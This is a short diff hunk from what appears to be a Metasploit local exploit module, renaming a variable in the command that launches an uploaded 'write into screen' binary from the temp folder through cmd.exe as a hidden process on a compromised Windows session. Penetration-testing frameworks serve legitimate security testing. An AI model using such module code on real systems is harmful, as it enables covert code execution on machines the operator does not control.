@@ -55,7 +55,7 @@ class Metasploit3 < Msf::Exploit::Local
 
     print_status("Executing uploaded files")
     # execute the write into screen binaries
-    cmd =  "cmd.exe /c start /d#{expand_path("%TEMP%")} /b  #{binary_path_exe}"
+    cmd =  "cmd.exe /c start /d#{expand_path("%TEMP%")} /b  #{path_write_into_screen_exe}"
     print_status(cmd)
     r = session.sys.process.execute( cmd, nil,{'Hidden' => true})
   end
